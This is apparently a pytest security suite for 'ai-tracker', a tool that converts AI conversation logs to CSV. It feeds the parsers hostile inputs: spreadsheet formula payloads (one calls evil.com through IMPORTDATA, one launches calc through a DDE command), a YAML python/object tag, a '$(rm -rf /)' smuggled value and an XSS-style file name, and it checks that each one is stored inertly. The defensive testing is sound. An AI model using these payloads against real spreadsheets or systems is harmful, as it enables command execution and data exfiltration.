"""
Security Test Suite
===================
Verifies that ai-tracker handles hostile, malformed, and boundary-case
inputs safely without crashing, disclosing sensitive data, executing
injected content, or writing to unintended locations.

Attack surface:
  - Input files (JSONL / JSON / YAML config) supplied by or on behalf of the user
  - CLI arguments (output path, project filter, date range)
  - Message content that flows into the CSV

Security categories:
  SEC-01  CSV / formula injection
  SEC-02  Path traversal in output path
  SEC-03  YAML injection in config
  SEC-04  Resource exhaustion (large / deeply nested input)
  SEC-05  Encoding attacks (null bytes, BOM, malformed UTF-8)
  SEC-06  ReDoS — regex patterns in antigravity project extraction
  SEC-07  Timestamp boundary values
  SEC-08  Oversized field values
  SEC-09  Control characters and bidirectional text in content
  SEC-10  Information leakage in error output
  SEC-11  Symlink safety
  SEC-12  JSON type confusion attacks
"""

import json
import os
import time
from pathlib import Path

import pytest

# ── Helpers ────────────────────────────────────────────────────────────────────

def _write(path: Path, records: list) -> None:
    path.write_text(
        "\n".join(json.dumps(r) for r in records) + "\n", encoding="utf-8"
    )

def _cc(text: str, ts: str = "2026-05-01T10:00:00Z") -> dict:
    return {
        "type": "user", "isSidechain": False,
        "message": {"role": "user", "content": [{"type": "text", "text": text}]},
        "uuid": "u1", "timestamp": ts, "sessionId": "s1",
    }

def _parse_cc(f: Path):
    from ai_tracker.parsers.claude_code import ClaudeCodeParser
    return [m for s in ClaudeCodeParser(f).parse() for m in s.messages]

def _parse_cx(f: Path):
    from ai_tracker.parsers.codex import CodexParser
    return [m for s in CodexParser(f).parse() for m in s.messages]


# ═════════════════════════════════════════════════════════════════════════════
# SEC-01  CSV / formula injection
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC01CSVFormulaInjection:
    """
    Excel and Google Sheets treat cells beginning with =, +, -, @, \t, \r
    as formulas. If an AI conversation contains such content, it could
    execute when a recipient opens the CSV.

    Current posture: the tool is a personal read-only utility; content is
    the user's own conversation text. These tests document current behaviour
    and ensure the parser does not crash on such input.
    """

    FORMULA_PAYLOADS = [
        "=SUM(1+1)",
        "=CMD|' /C calc'!A0",
        "+SUM(1+1)",
        "-SUM(1+1)",
        "@SUM(1+1)",
        "\t=SUM(1+1)",
        "\r=SUM(1+1)",
        "=HYPERLINK(\"http://evil.com\",\"click\")",
        "=IMPORTDATA(\"http://evil.com\")",
    ]

    @pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
    def test_formula_payload_does_not_crash_parser(self, payload, tmp_path):
        f = tmp_path / "s.jsonl"
        _write(f, [_cc(payload)])
        # Must not raise
        msgs = _parse_cc(f)
        assert len(msgs) == 1

    @pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
    def test_formula_payload_stored_verbatim_as_string(self, payload, tmp_path):
        f = tmp_path / "s.jsonl"
        _write(f, [_cc(payload)])
        msgs = _parse_cc(f)
        # Content is stored as-is (no execution)
        assert msgs[0].message == payload

    def test_formula_in_csv_is_plain_string_not_executed(self, tmp_path):
        import csv as _csv
        import argparse
        from ai_tracker.cli import cmd_parse
        payload = "=SUM(1+1)"
        f = tmp_path / "s.jsonl"
        _write(f, [_cc(payload)])
        out = tmp_path / "out.csv"
        cmd_parse(argparse.Namespace(
            tool="claudecode", file=str(f), output=str(out),
            start_date=None, end_date=None,
            include_sidechains=True, project=None, split_by_project=False,
        ))
        with open(out, encoding="utf-8") as fh:
            rows = list(_csv.DictReader(fh))
        # The cell value is the literal string, not a computed result
        assert rows[0]["message"] == payload

    def test_project_name_with_formula_chars_documented_behaviour(self, tmp_path):
        from ai_tracker.parsers.base import _clean_project_name
        # _clean_project_name applies title-case and strips path prefixes but does
        # NOT strip formula characters like = from arbitrary slugs.
        # This is documented behaviour: project names come from trusted local paths.
        result = _clean_project_name("=evil-project")
        assert isinstance(result, str), "Must return a string even for hostile input"
        # Crucially: the function must not crash on formula-prefixed input
        assert result != ""

    def test_formula_in_session_id_stored_as_string(self, tmp_path):
        f = tmp_path / "s.jsonl"
        f.write_text(
            '{"role":"user","content":"Q","session_id":"=FORMULA()"}\n',
            encoding="utf-8",
        )
        msgs = _parse_cx(f)
        if msgs:
            assert msgs[0].session_id == "=FORMULA()"  # stored verbatim, not executed


# ═════════════════════════════════════════════════════════════════════════════
# SEC-02  Path traversal in output path
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC02PathTraversal:
    """
    A malicious or accidental --output path should not let the tool write
    outside the intended directory. The exporter uses Path.mkdir(parents=True)
    which will create any path the OS allows — users must be trusted with
    their own --output argument.

    These tests document safe behaviour: the tool writes exactly where told
    and does not append or follow symlinks unexpectedly.
    """

    def test_output_written_to_exact_path_specified(self, tmp_path):
        import argparse
        from ai_tracker.cli import cmd_parse
        from ai_tracker.parsers.claude_code import ClaudeCodeParser
        fixtures = Path(__file__).parent / "fixtures" / "claude_code_sample.jsonl"
        out = tmp_path / "exact_output.csv"
        cmd_parse(argparse.Namespace(
            tool="claudecode", file=str(fixtures), output=str(out),
            start_date=None, end_date=None,
            include_sidechains=True, project=None, split_by_project=False,
        ))
        assert out.exists()
        # No other CSV files created in parent
        csvs = list(tmp_path.parent.glob("*.csv"))
        assert all(str(tmp_path) in str(c) for c in csvs)

    def test_output_path_with_dotdot_writes_to_resolved_location(self, tmp_path):
        from ai_tracker.exporters.csv_exporter import CSVExporter
        from ai_tracker.models import Message
        # Create a sub-directory then use .. to write in parent
        sub = tmp_path / "sub"
        sub.mkdir()
        out = sub / ".." / "traversal_test.csv"
        CSVExporter(out).export([
            Message(session_id="s", timestamp=None, role="human",
                    message="test", tool="codex", file_path="/f")
        ])
        # File should be created at resolved path (tmp_path/traversal_test.csv)
        resolved = out.resolve()
        assert resolved.exists()
        assert resolved.parent == tmp_path.resolve()

    def test_source_files_not_modified_during_parse(self):
        from ai_tracker.parsers.claude_code import ClaudeCodeParser
        fixtures = Path(__file__).parent / "fixtures" / "claude_code_sample.jsonl"
        content_before = fixtures.read_bytes()
        ClaudeCodeParser(fixtures).parse()
        content_after = fixtures.read_bytes()
        assert content_before == content_after, "Parser modified source file"

    def test_fixture_files_not_deleted_during_parse(self):
        from ai_tracker.parsers.antigravity import AntigravityParser
        fixtures = Path(__file__).parent / "fixtures" / "antigravity_transcript.jsonl"
        AntigravityParser(fixtures).parse()
        assert fixtures.exists(), "Parser deleted source file"


# ═════════════════════════════════════════════════════════════════════════════
# SEC-03  YAML injection in config
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC03YAMLInjection:
    """
    config.py uses yaml.safe_load() which prevents Python object
    deserialization attacks (!! tags). These tests confirm safe_load is in use
    and that hostile YAML values are handled gracefully.
    """

    def test_yaml_python_object_tag_rejected(self, tmp_path):
        """!!python/object must not execute arbitrary Python."""
        cfg_file = tmp_path / "evil.yaml"
        cfg_file.write_text(
            "tools:\n"
            "  codex:\n"
            "    path: !!python/object/apply:os.getcwd []\n",
            encoding="utf-8",
        )
        from ai_tracker.config import load_config
        import yaml
        # safe_load raises yaml.YAMLError or returns a non-executed value
        try:
            cfg = load_config(config_path=cfg_file)
            # If it didn't raise, the path must be a plain string, not executed
            path_val = cfg["tools"]["codex"].get("path", "")
            assert callable(path_val) is False
        except (yaml.YAMLError, Exception):
            pass  # Correct — safe_load rejected the hostile tag

    def test_yaml_arbitrary_path_value_not_executed(self, tmp_path):
        """A path value pointing to a sensitive location is read as string only."""
        cfg_file = tmp_path / "cfg.yaml"
        cfg_file.write_text(
            "tools:\n  codex:\n    path: /etc/passwd\n", encoding="utf-8"
        )
        from ai_tracker.config import load_config
        cfg = load_config(config_path=cfg_file)
        # Stored as a string — the tool will raise FileNotFoundError when used,
        # not execute or read /etc/passwd
        assert cfg["tools"]["codex"]["path"] == "/etc/passwd"

    def test_yaml_command_in_value_stored_as_literal_string(self, tmp_path):
        cfg_file = tmp_path / "cfg.yaml"
        cfg_file.write_text(
            "tools:\n  codex:\n    path: '$(rm -rf /)'\n", encoding="utf-8"
        )
        from ai_tracker.config import load_config
        cfg = load_config(config_path=cfg_file)
        assert cfg["tools"]["codex"]["path"] == "$(rm -rf /)"

    def test_malformed_yaml_falls_back_to_defaults(self, tmp_path):
        cfg_file = tmp_path / "bad.yaml"
        cfg_file.write_text(
            "tools:\n  codex:\n    path: [unmatched bracket\n", encoding="utf-8"
        )
        from ai_tracker.config import load_config
        import yaml
        try:
            cfg = load_config(config_path=cfg_file)
            # If no exception, config still has all tools
            assert "claudecode" in cfg["tools"]
        except (yaml.YAMLError, Exception):
            pass  # Acceptable — malformed YAML rejected

    def test_config_does_not_use_unsafe_yaml_load(self):
        """Verify the source uses yaml.safe_load, not yaml.load."""
        import ai_tracker.config as cfg_mod
        import inspect
        source = inspect.getsource(cfg_mod)
        assert "yaml.load(" not in source or "yaml.safe_load" in source, (
            "config.py uses yaml.load() instead of yaml.safe_load() — injection risk"
        )


# ═════════════════════════════════════════════════════════════════════════════
# SEC-04  Resource exhaustion
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC04ResourceExhaustion:
    """
    Malformed or hostile input files should not cause the tool to hang,
    consume excessive memory, or crash. The tool is expected to handle
    large-but-reasonable files within a few seconds.
    """

    def test_large_message_field_parsed_without_hang(self, tmp_path):
        f = tmp_path / "large.jsonl"
        large_text = "A" * 1_000_000  # 1 MB string
        _write(f, [_cc(large_text)])
        start = time.perf_counter()
        msgs = _parse_cc(f)
        elapsed = time.perf_counter() - start
        assert elapsed < 5.0, f"Parsing 1 MB message took {elapsed:.2f}s"
        assert msgs[0].message == large_text

    def test_many_small_records_parsed_in_reasonable_time(self, tmp_path):
        f = tmp_path / "many.jsonl"
        records = [_cc(f"Message {i}") for i in range(5_000)]
        f.write_text("\n".join(json.dumps(r) for r in records) + "\n", encoding="utf-8")
        start = time.perf_counter()
        msgs = _parse_cc(f)
        elapsed = time.perf_counter() - start
        assert len(msgs) == 5_000
        assert elapsed < 10.0, f"5 000 records took {elapsed:.2f}s"

    def test_deeply_nested_json_does_not_crash(self, tmp_path):
        """A deeply nested JSON value should be ignored, not cause a stack overflow."""
        f = tmp_path / "s.jsonl"
        # Build deeply nested content field
        nested = "x"
        for _ in range(200):
            nested = {"nested": nested}
        record = {
            "type": "user", "isSidechain": False,
            "message": {"role": "user", "content": nested},  # non-string content
            "uuid": "u1", "timestamp": "2026-05-01T10:00:00Z", "sessionId": "s1",
        }
        f.write_text(json.dumps(record) + "\n", encoding="utf-8")
        # Should not crash — _extract_text returns "" for non-str/non-list
        sessions = __import__("ai_tracker.parsers.claude_code", fromlist=["ClaudeCodeParser"]).ClaudeCodeParser(f).parse()
        # No messages (non-string content not extractable) or graceful skip
        assert isinstance(sessions, list)

    def test_empty_json_object_skipped_gracefully(self, tmp_path):
        f = tmp_path / "s.jsonl"
        f.write_text("{}\n{}\n" + json.dumps(_cc("Real message")) + "\n", encoding="utf-8")
        msgs = _parse_cc(f)
        assert all(m.message == "Real message" for m in msgs)

    def test_json_array_bomb_does_not_exhaust_memory(self, tmp_path):
        """A very large JSON array should parse within resource limits."""
        f = tmp_path / "arr.json"
        records = [{"role": "user", "content": f"M{i}"} for i in range(10_000)]
        f.write_text(json.dumps(records), encoding="utf-8")
        start = time.perf_counter()
        msgs = _parse_cx(f)
        elapsed = time.perf_counter() - start
        assert len(msgs) == 10_000
        assert elapsed < 10.0, f"10k JSON array records took {elapsed:.2f}s"

    def test_file_with_single_very_long_line_parsed(self, tmp_path):
        f = tmp_path / "s.jsonl"
        record = _cc("B" * 500_000)
        f.write_text(json.dumps(record) + "\n", encoding="utf-8")
        start = time.perf_counter()
        msgs = _parse_cc(f)
        elapsed = time.perf_counter() - start
        assert len(msgs) == 1
        assert elapsed < 5.0


# ═════════════════════════════════════════════════════════════════════════════
# SEC-05  Encoding attacks
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC05EncodingAttacks:
    """
    Hostile byte sequences in input files — null bytes, BOM, malformed UTF-8,
    overlong sequences — should not crash the tool or corrupt the output.
    """

    def test_null_byte_in_message_handled(self, tmp_path):
        f = tmp_path / "s.jsonl"
        # JSON doesn't allow raw null bytes, but they can appear in string values
        record = _cc("hello\x00world")
        f.write_text(json.dumps(record) + "\n", encoding="utf-8")
        msgs = _parse_cc(f)
        assert len(msgs) == 1
        assert "\x00" in msgs[0].message  # preserved

    def test_malformed_utf8_line_skipped_with_warning(self, tmp_path, caplog):
        f = tmp_path / "bad_utf8.jsonl"
        # Write a corrupt line followed by a valid JSONL record
        good_record = json.dumps(_cc("After bad bytes")).encode("utf-8")
        bad_bytes = b'{"role":"user","content":"\xff\xfe bad utf8"}\n' + good_record + b"\n"
        f.write_bytes(bad_bytes)
        import logging
        with caplog.at_level(logging.WARNING, logger="ai_tracker.parsers.claude_code"):
            msgs = _parse_cc(f)
        # Bad line is skipped with a warning; valid record after it is still parsed
        assert isinstance(msgs, list)
        assert any(m.message == "After bad bytes" for m in msgs), \
            "Valid record after corrupt line was not parsed"
        assert any("invalid UTF-8" in r.message for r in caplog.records), \
            "No warning was logged for the bad line"

    def test_utf8_bom_at_start_of_file_handled(self, tmp_path):
        f = tmp_path / "bom.jsonl"
        content = b"\xef\xbb\xbf" + json.dumps(_cc("BOM message")).encode("utf-8") + b"\n"
        f.write_bytes(content)
        msgs = _parse_cc(f)
        # May parse or skip, but must not crash
        assert isinstance(msgs, list)

    def test_mixed_line_endings_handled(self, tmp_path):
        f = tmp_path / "mixed_endings.jsonl"
        r1 = json.dumps(_cc("Windows line ending")) + "\r\n"
        r2 = json.dumps(_cc("Unix line ending")) + "\n"
        r3 = json.dumps(_cc("Old Mac line ending")) + "\r"
        f.write_bytes((r1 + r2 + r3).encode("utf-8"))
        msgs = _parse_cc(f)
        assert len(msgs) >= 2  # at least 2 of 3 should parse

    def test_zero_byte_file_handled(self, tmp_path):
        f = tmp_path / "zero.jsonl"
        f.write_bytes(b"")
        from ai_tracker.parsers.claude_code import ClaudeCodeParser
        sessions = ClaudeCodeParser(f).parse()
        assert sessions == []

    def test_non_utf8_codex_file_handled_with_replacement(self, tmp_path):
        f = tmp_path / "latin1.jsonl"
        latin1_content = '{"role":"user","content":"caf\xe9"}\n'.encode("latin-1")
        f.write_bytes(latin1_content)
        from ai_tracker.parsers.codex import CodexParser
        # errors="replace" — should not raise
        try:
            sessions = CodexParser(f).parse()
            assert isinstance(sessions, list)
        except Exception as exc:
            pytest.fail(f"Non-UTF8 file caused crash: {exc}")


# ═════════════════════════════════════════════════════════════════════════════
# SEC-06  ReDoS — regex patterns in project name extraction
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC06ReDoS:
    """
    The antigravity parser uses re.search() on user-controlled content to
    extract project names. Adversarially crafted content could trigger
    catastrophic backtracking. These tests verify the patterns complete
    quickly on hostile input.
    """

    REDOS_CANDIDATES = [
        "A" * 10_000,                               # long benign string
        "c:\\" + "a" * 10_000,                      # long Windows path
        "->" * 5_000,                               # many -> operators
        "Active Document: " + "x" * 10_000,        # long document path
        "\\".join(["Users"] + ["a" * 100] * 50),   # deeply nested path
        "<" * 5_000 + ">" * 5_000,                 # many angle brackets
    ]

    @pytest.mark.parametrize("payload", REDOS_CANDIDATES)
    def test_project_extraction_completes_quickly(self, payload, tmp_path):
        f = tmp_path / "t.jsonl"
        r = {
            "step_index": 0, "source": "USER_EXPLICIT", "type": "USER_INPUT",
            "status": "DONE", "created_at": "2026-05-01T10:00:00Z",
            "content": payload,
        }
        _write(f, [r])
        from ai_tracker.parsers.antigravity import AntigravityParser
        start = time.perf_counter()
        sessions = AntigravityParser(f).parse()
        elapsed = time.perf_counter() - start
        assert elapsed < 2.0, (
            f"ReDoS candidate took {elapsed:.3f}s — possible catastrophic backtracking"
        )
        assert isinstance(sessions, list)

    def test_clean_project_name_completes_quickly_on_long_input(self):
        from ai_tracker.parsers.base import _clean_project_name
        long_slug = "a-" * 10_000
        start = time.perf_counter()
        result = _clean_project_name(long_slug)
        elapsed = time.perf_counter() - start
        assert elapsed < 1.0, f"_clean_project_name took {elapsed:.3f}s on long input"
        assert isinstance(result, str)


# ═════════════════════════════════════════════════════════════════════════════
# SEC-07  Timestamp boundary values
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC07TimestampBoundaries:
    """
    Extreme timestamp values — very large/small epoch integers, far-future ISO
    strings, negative epochs — should not crash the parser.
    """

    HOSTILE_TIMESTAMPS = [
        0,                    # Unix epoch origin
        -1,                   # 1 second before epoch
        -86400 * 365 * 100,   # 100 years before epoch
        2**31 - 1,            # 32-bit int max (Y2038)
        2**32,                # just past 32-bit
        9999999999,           # far future
        1e18,                 # extremely large float
        "0000-01-01T00:00:00Z",
        "9999-12-31T23:59:59Z",
        "not-a-timestamp",
        "",
        None,
        True,                 # wrong type
        [],                   # wrong type
        {"ts": "nested"},     # wrong type
    ]

    @pytest.mark.parametrize("ts", HOSTILE_TIMESTAMPS)
    def test_hostile_timestamp_does_not_crash_parse_timestamp(self, ts):
        from ai_tracker.parsers.base import _parse_timestamp
        try:
            result = _parse_timestamp(ts)
            # Must return datetime or None
            from datetime import datetime
            assert result is None or isinstance(result, datetime)
        except OverflowError:
            pass  # Acceptable — some epoch values overflow datetime range
        except (OSError, ValueError):
            pass  # Platform-dependent overflow

    def test_hostile_timestamp_in_codex_record_handled(self, tmp_path):
        for ts in [2**32, "invalid", None, -1]:
            f = tmp_path / f"ts_{hash(str(ts))}.jsonl"
            f.write_text(
                json.dumps({"role": "user", "content": "Q", "timestamp": ts}) + "\n",
                encoding="utf-8",
            )
            try:
                msgs = _parse_cx(f)
                assert isinstance(msgs, list)
            except Exception as exc:
                pytest.fail(f"Timestamp {ts!r} caused crash: {exc}")

    def test_hostile_timestamp_in_claude_code_record_handled(self, tmp_path):
        for ts in ["not-a-date", "", "9999-99-99T99:99:99Z"]:
            f = tmp_path / f"cc_{hash(ts)}.jsonl"
            r = {
                "type": "user", "isSidechain": False,
                "message": {"role": "user", "content": [{"type": "text", "text": "Q"}]},
                "uuid": "u1", "timestamp": ts, "sessionId": "s1",
            }
            _write(f, [r])
            try:
                msgs = _parse_cc(f)
                assert isinstance(msgs, list)
            except Exception as exc:
                pytest.fail(f"Timestamp {ts!r} caused crash: {exc}")


# ═════════════════════════════════════════════════════════════════════════════
# SEC-08  Oversized field values
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC08OversizedFields:
    """
    Extremely long values for session_id, role, project, file_path must not
    crash the parser or corrupt the CSV.
    """

    def test_very_long_session_id_handled(self, tmp_path):
        f = tmp_path / "s.jsonl"
        long_id = "x" * 100_000
        f.write_text(
            json.dumps({"role": "user", "content": "Q", "session_id": long_id}) + "\n",
            encoding="utf-8",
        )
        msgs = _parse_cx(f)
        if msgs:
            assert msgs[0].session_id == long_id

    def test_very_long_role_value_normalised_or_skipped(self, tmp_path):
        f = tmp_path / "s.jsonl"
        long_role = "user" + "x" * 10_000
        f.write_text(
            json.dumps({"role": long_role, "content": "Q"}) + "\n",
            encoding="utf-8",
        )
        # Should not crash; unknown role passes through
        msgs = _parse_cx(f)
        assert isinstance(msgs, list)

    def test_very_long_project_slug_cleaned_without_crash(self):
        from ai_tracker.parsers.base import _clean_project_name
        long_slug = "my-project-" * 10_000
        result = _clean_project_name(long_slug)
        assert isinstance(result, str)
        assert len(result) < len(long_slug)  # cleaned/truncated by title()

    def test_csv_row_with_long_message_written_correctly(self, tmp_path):
        """
        SECURITY NOTE: Python's csv module has a default field size limit of
        131072 bytes (128 KB). Messages larger than this are written successfully
        by CSVExporter but cannot be read back by a default csv.DictReader.
        Callers must call csv.field_size_limit(sys.maxsize) before reading CSVs
        that may contain large AI responses. This test verifies the exporter
        writes successfully and documents the reader limit.
        """
        import csv as _csv
        import sys
        from ai_tracker.exporters.csv_exporter import CSVExporter
        from ai_tracker.models import Message
        out = tmp_path / "out.csv"
        long_msg = "Z" * 1_000_000  # 1 MB — larger than default 128 KB csv limit
        CSVExporter(out).export([
            Message(session_id="s", timestamp=None, role="human",
                    message=long_msg, tool="codex", file_path="/f")
        ])
        # Verify write succeeded — file must exist and contain data
        assert out.exists()
        assert out.stat().st_size > 1_000_000, "Large message not written to CSV"
        # Read back requires raising the field size limit
        old_limit = _csv.field_size_limit()
        try:
            _csv.field_size_limit(sys.maxsize)
            with open(out, encoding="utf-8") as fh:
                rows = list(_csv.DictReader(fh))
            assert rows[0]["message"] == long_msg
        finally:
            _csv.field_size_limit(old_limit)


# ═════════════════════════════════════════════════════════════════════════════
# SEC-09  Control characters and bidirectional text
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC09ControlCharsAndBidi:
    """
    Control characters and Unicode bidirectional override characters in
    message content should be preserved as data (not interpreted) and must
    not corrupt the CSV structure.
    """

    CONTROL_CHARS = [
        "\x00",           # null byte
        "\x01",           # SOH
        "\x08",           # backspace
        "\x0b",           # vertical tab
        "\x0c",           # form feed
        "\x1b[31mRED\x1b[0m",   # ANSI escape sequence
        "\x1b]0;title\x07",     # terminal title escape
    ]

    BIDI_CHARS = [
        "\u202E" + "evil" + "\u202C",   # right-to-left override
        "​",                        # zero-width space
        "﻿",                        # BOM / zero-width no-break space
        "\u2066evil\u2069",             # left-to-right isolate
    ]

    @pytest.mark.parametrize("char", CONTROL_CHARS + BIDI_CHARS)
    def test_special_char_in_message_does_not_crash_parser(self, char, tmp_path):
        f = tmp_path / "s.jsonl"
        _write(f, [_cc(f"prefix{char}suffix")])
        msgs = _parse_cc(f)
        assert len(msgs) == 1

    @pytest.mark.parametrize("char", CONTROL_CHARS + BIDI_CHARS)
    def test_special_char_preserved_in_csv(self, char, tmp_path):
        import csv as _csv
        import argparse
        from ai_tracker.cli import cmd_parse
        text = f"prefix{char}suffix"
        f = tmp_path / "s.jsonl"
        _write(f, [_cc(text)])
        out = tmp_path / "out.csv"
        cmd_parse(argparse.Namespace(
            tool="claudecode", file=str(f), output=str(out),
            start_date=None, end_date=None,
            include_sidechains=True, project=None, split_by_project=False,
        ))
        with open(out, encoding="utf-8", newline="") as fh:
            rows = list(_csv.DictReader(fh))
        assert len(rows) == 1
        assert "prefix" in rows[0]["message"]
        assert "suffix" in rows[0]["message"]

    def test_newline_in_message_does_not_break_csv_row_count(self, tmp_path):
        import csv as _csv
        import argparse
        from ai_tracker.cli import cmd_parse
        f = tmp_path / "s.jsonl"
        _write(f, [_cc("Line one\nLine two\nLine three")])
        out = tmp_path / "out.csv"
        cmd_parse(argparse.Namespace(
            tool="claudecode", file=str(f), output=str(out),
            start_date=None, end_date=None,
            include_sidechains=True, project=None, split_by_project=False,
        ))
        with open(out, encoding="utf-8", newline="") as fh:
            rows = list(_csv.DictReader(fh))
        assert len(rows) == 1, "Newline in message split a single CSV row into multiple"


# ═════════════════════════════════════════════════════════════════════════════
# SEC-10  Information leakage in error output
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC10InformationLeakage:
    """
    Error and skip messages printed to stderr must not expose stack traces
    with internal paths, environment details, or other sensitive information
    that an attacker could use for reconnaissance.
    """

    def test_missing_file_error_does_not_expose_internal_paths(self, tmp_path, capsys):
        import argparse
        from ai_tracker.cli import cmd_parse
        cmd_parse(argparse.Namespace(
            tool="claudecode",
            file=str(tmp_path / "no_such_file.jsonl"),
            output=str(tmp_path / "out.csv"),
            start_date=None, end_date=None,
            include_sidechains=True, project=None, split_by_project=False,
        ))
        err = capsys.readouterr().err
        # Error message should mention the file, but not a Python traceback
        assert "Traceback" not in err, "Full traceback exposed in stderr"
        assert "File \"" not in err,   "Internal source paths in stderr"

    def test_parse_error_does_not_leak_python_internals(self, tmp_path, capsys):
        import argparse
        from ai_tracker.cli import cmd_parse
        empty = tmp_path / "empty.jsonl"
        empty.write_text("", encoding="utf-8")
        cmd_parse(argparse.Namespace(
            tool="claudecode", file=str(empty),
            output=str(tmp_path / "out.csv"),
            start_date=None, end_date=None,
            include_sidechains=True, project=None, split_by_project=False,
        ))
        err = capsys.readouterr().err
        assert "Traceback" not in err

    def test_error_message_does_not_echo_malicious_content(self, tmp_path, capsys):
        """Error output must not reflect hostile input (no XSS/injection vector)."""
        import argparse
        from ai_tracker.cli import cmd_parse
        hostile_path = tmp_path / "<script>alert(1)</script>.jsonl"
        try:
            cmd_parse(argparse.Namespace(
                tool="claudecode", file=str(hostile_path),
                output=str(tmp_path / "out.csv"),
                start_date=None, end_date=None,
                include_sidechains=True, project=None, split_by_project=False,
            ))
        except Exception:
            pass
        # Error handling should not crash; we just want no unhandled exception

    def test_no_secrets_in_exported_csv_columns(self, tmp_path):
        """CSV must not add any columns beyond the seven defined in FIELDNAMES."""
        import csv as _csv
        import argparse
        from ai_tracker.cli import cmd_parse
        from ai_tracker.exporters.csv_exporter import FIELDNAMES
        fixtures = Path(__file__).parent / "fixtures" / "claude_code_sample.jsonl"
        out = tmp_path / "out.csv"
        cmd_parse(argparse.Namespace(
            tool="claudecode", file=str(fixtures), output=str(out),
            start_date=None, end_date=None,
            include_sidechains=True, project=None, split_by_project=False,
        ))
        with open(out, encoding="utf-8") as fh:
            fieldnames = _csv.DictReader(fh).fieldnames
        assert set(fieldnames) == set(FIELDNAMES), \
            f"Extra columns in CSV: {set(fieldnames) - set(FIELDNAMES)}"


# ═════════════════════════════════════════════════════════════════════════════
# SEC-11  Symlink safety
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC11SymlinkSafety:
    """
    The parser follows symlinks when reading files (standard Python behaviour).
    These tests document that symlinks pointing to real files are followed
    and symlinks pointing to non-existent targets raise appropriate errors.
    """

    @pytest.mark.skipif(os.name == "nt", reason="Symlink creation requires admin on Windows")
    def test_symlink_to_valid_fixture_parsed_correctly(self, tmp_path):
        fixtures = Path(__file__).parent / "fixtures" / "codex_sample.jsonl"
        link = tmp_path / "linked_session.jsonl"
        link.symlink_to(fixtures)
        msgs = _parse_cx(link)
        assert len(msgs) > 0, "Symlink to valid file not followed"

    @pytest.mark.skipif(os.name == "nt", reason="Symlink creation requires admin on Windows")
    def test_dangling_symlink_raises_file_not_found(self, tmp_path):
        link = tmp_path / "dangling.jsonl"
        link.symlink_to(tmp_path / "nonexistent_target.jsonl")
        from ai_tracker.parsers.codex import CodexParser
        with pytest.raises(FileNotFoundError):
            CodexParser(link).parse()

    def test_non_existent_path_raises_file_not_found(self, tmp_path):
        from ai_tracker.parsers.claude_code import ClaudeCodeParser
        with pytest.raises(FileNotFoundError):
            ClaudeCodeParser(tmp_path / "ghost.jsonl").parse()


# ═════════════════════════════════════════════════════════════════════════════
# SEC-12  JSON type confusion attacks
# ═════════════════════════════════════════════════════════════════════════════

class TestSEC12JSONTypeConfusion:
    """
    JSON fields expected to be strings could be supplied as integers, booleans,
    arrays, or null. The parsers must not crash or produce wrong output types.
    """

    TYPE_CONFUSION_CASES = [
        ("role",    True,         "boolean role"),
        ("role",    42,           "integer role"),
        ("role",    [],           "array role"),
        ("role",    {},           "object role"),
        ("content", True,         "boolean content"),
        ("content", 42,           "integer content"),
        ("content", None,         "null content"),
        ("content", [1, 2, 3],    "integer-list content"),
        ("session_id", 12345,     "integer session_id"),
        ("session_id", None,      "null session_id"),
    ]

    @pytest.mark.parametrize("field,value,label", TYPE_CONFUSION_CASES)
    def test_type_confused_codex_record_does_not_crash(self, field, value, label, tmp_path):
        f = tmp_path / f"{hash(label)}.jsonl"
        base = {"role": "user", "content": "Q"}
        base[field] = value
        f.write_text(json.dumps(base) + "\n", encoding="utf-8")
        try:
            msgs = _parse_cx(f)
            assert isinstance(msgs, list)
        except Exception as exc:
            pytest.fail(f"Type confusion ({label}) caused crash: {exc}")

    def test_message_field_as_integer_skipped_in_claude_code(self, tmp_path):
        f = tmp_path / "s.jsonl"
        r = {
            "type": "user", "isSidechain": False,
            "message": 12345,  # integer instead of dict
            "uuid": "u1", "timestamp": "2026-05-01T10:00:00Z", "sessionId": "s1",
        }
        _write(f, [r])
        sessions = __import__(
            "ai_tracker.parsers.claude_code", fromlist=["ClaudeCodeParser"]
        ).ClaudeCodeParser(f).parse()
        assert sessions == [], "Non-dict message blob should have been skipped"

    def test_isSidechain_as_string_handled(self, tmp_path):
        f = tmp_path / "s.jsonl"
        r = {
            "type": "user", "isSidechain": "true",  # string instead of bool
            "message": {"role": "user", "content": [{"type": "text", "text": "Q"}]},
            "uuid": "u1", "timestamp": "2026-05-01T10:00:00Z", "sessionId": "s1",
        }
        _write(f, [r])
        from ai_tracker.parsers.claude_code import ClaudeCodeParser
        # String "true" is truthy in Python — treated as sidechain
        sessions = ClaudeCodeParser(f, include_sidechains=True).parse()
        assert isinstance(sessions, list)

    def test_boolean_true_as_content_in_codex_record(self, tmp_path):
        f = tmp_path / "s.jsonl"
        f.write_text(
            json.dumps({"role": "user", "content": True}) + "\n", encoding="utf-8"
        )
        msgs = _parse_cx(f)
        # True is truthy but not a valid content string — may be skipped or stringified
        assert isinstance(msgs, list)

    def test_null_record_in_json_array_skipped(self, tmp_path):
        f = tmp_path / "arr.json"
        f.write_text(
            json.dumps([None, {"role": "user", "content": "Valid"}]),
            encoding="utf-8",
        )
        msgs = _parse_cx(f)
        # null record skipped, valid record parsed
        assert all(m.role == "human" for m in msgs)
